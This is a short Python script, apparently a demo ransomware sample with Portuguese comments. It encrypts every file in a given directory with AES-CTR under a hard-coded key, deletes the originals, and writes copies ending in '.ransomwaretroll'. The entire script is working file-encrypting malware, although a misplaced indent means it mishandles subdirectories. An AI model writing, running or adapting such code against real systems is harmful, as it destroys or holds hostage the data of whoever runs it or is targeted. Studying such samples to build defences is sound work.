import os, sys
import pyaes

# caminho do diretorio escolhido recebido 
if len(sys.argv) > 1:
        diretorio = sys.argv[1]
else:
        print("""Modo de uso: 
        python3 encrypter.py /nome-diretorio 
""")
        exit()

## definindo chave de criptografia
key = b"testeransomwares"

# abrir os arquivos do diretorio para criptografia
for file_name in os.listdir(diretorio):
        caminho_ar = os.path.join(diretorio, file_name)

        # verificando se e um arquivo
        if os.path.isfile(caminho_ar):
                #abrindo arquivo para criptografar
                with open(caminho_ar, "rb") as file:
                        file_data = file.read()

                # remover o arquivo
                os.remove(caminho_ar)

        # chave para criptogafar
        aes = pyaes.AESModeOfOperationCTR(key)

        ## criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # adiciona a extensao criptografada
        new_file = caminho_ar + ".ransomwaretroll"

        ## salvar o arquivo criptografado
        with open(new_file, 'wb') as new:
                new.write(crypto_data)
                new.close()
